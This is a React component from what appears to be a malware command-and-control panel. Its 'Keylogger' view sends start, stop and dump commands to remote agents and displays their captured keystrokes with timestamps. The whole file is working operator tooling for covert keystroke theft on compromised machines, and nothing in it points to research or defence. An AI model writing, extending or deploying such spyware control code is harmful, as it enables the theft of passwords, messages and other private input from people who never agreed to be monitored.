import React, { useState, useEffect, useRef } from 'react';
import { Keyboard, Play, Square, Download, RefreshCw, Trash2, FileText } from 'lucide-react';
import { sendCommand } from '../../services/api';
import { kaalEvents } from '../../services/eventBus';

const Keylogger = ({ agentId }) => {
    const [logs, setLogs] = useState([]);
    const [status, setStatus] = useState('unknown'); // running, stopped
    const [loading, setLoading] = useState(false);
    const logsEndRef = useRef(null);

    useEffect(() => {
        // Scroll to bottom
        logsEndRef.current?.scrollIntoView({ behavior: 'smooth' });
    }, [logs]);

    useEffect(() => {
        // Listen for keylog results
        const unsubscribe = kaalEvents.on('task_result', (data) => {
            if (data.agent_id !== agentId) return;

            if (data.result && data.result.startsWith("[KEYLOG]")) {
                const newLogs = data.result.substring(8); // Remove prefix
                if (newLogs.trim().length > 0) {
                    const timestamp = new Date().toLocaleTimeString();
                    setLogs(prev => [...prev, { time: timestamp, content: newLogs }]);
                }
            } else if (data.result && data.result.includes("Keylogger started")) {
                setStatus('running');
                setLoading(false);
            } else if (data.result && data.result.includes("Keylogger stopped")) {
                setStatus('stopped');
                setLoading(false);
            }
        });

        // Initial check or dump
        handleDump();

        return () => unsubscribe();
    }, [agentId]);

    const handleStart = async () => {
        setLoading(true);
        await sendCommand(agentId, 'keylog_start');
    };

    const handleStop = async () => {
        setLoading(true);
        await sendCommand(agentId, 'keylog_stop');
    };

    const handleDump = async () => {
        setLoading(true);
        await sendCommand(agentId, 'keylog_dump');
        setTimeout(() => setLoading(false), 1000);
    };

    const clearLogs = () => setLogs([]);

    return (
        <div className="h-full flex flex-col space-y-4">
            {/* Controls */}
            <div className="flex items-center justify-between p-4 bg-bg-secondary rounded-xl border border-border">
                <div>
                    <h3 className="text-sm font-semibold uppercase text-text-secondary tracking-wider flex items-center">
                        <Keyboard className="w-4 h-4 mr-2 text-accent-secondary" />
                        Keylogger
                    </h3>
                    <p className="text-xs text-text-secondary mt-1">
                        Status: <span className={status === 'running' ? 'text-accent-primary' : 'text-gray-500'}>{status.toUpperCase()}</span>
                    </p>
                </div>
                <div className="flex space-x-2">
                    {status !== 'running' ? (
                        <button onClick={handleStart} disabled={loading} className="p-2 bg-accent-primary/10 text-accent-primary rounded hover:bg-accent-primary/20 border border-accent-primary/50">
                            <Play className="w-4 h-4" />
                        </button>
                    ) : (
                        <button onClick={handleStop} disabled={loading} className="p-2 bg-red-500/10 text-red-500 rounded hover:bg-red-500/20 border border-red-500/50">
                            <Square className="w-4 h-4" />
                        </button>
                    )}
                    <button onClick={handleDump} disabled={loading} className="p-2 bg-bg-primary text-text-primary rounded hover:bg-white/5 border border-border" title="Fetch Logs">
                        <RefreshCw className={`w-4 h-4 ${loading ? 'animate-spin' : ''}`} />
                    </button>
                    <button onClick={clearLogs} className="p-2 bg-bg-primary text-text-primary rounded hover:bg-white/5 border border-border" title="Clear View">
                        <Trash2 className="w-4 h-4" />
                    </button>
                </div>
            </div>

            {/* Logs View */}
            <div className="flex-1 bg-black rounded-xl border border-border p-4 overflow-auto font-mono text-sm relative">
                {logs.length === 0 ? (
                    <div className="flex flex-col items-center justify-center h-full text-gray-600 opacity-50">
                        <FileText className="w-12 h-12 mb-2" />
                        <p>No keystrokes captured yet</p>
                    </div>
                ) : (
                    <div className="space-y-4">
                        {logs.map((log, i) => (
                            <div key={i} className="group">
                                <div className="text-[10px] text-gray-600 mb-1 flex items-center">
                                    <span className="w-2 h-2 rounded-full bg-accent-primary mr-2"></span>
                                    {log.time}
                                </div>
                                <div className="bg-[#111] p-3 rounded border border-white/5 text-gray-300 whitespace-pre-wrap leading-relaxed shadow-sm group-hover:border-accent-primary/30 transition-colors">
                                    {log.content}
                                </div>
                            </div>
                        ))}
                    </div>
                )}
                <div ref={logsEndRef} />
            </div>
        </div>
    );
};

export default Keylogger;
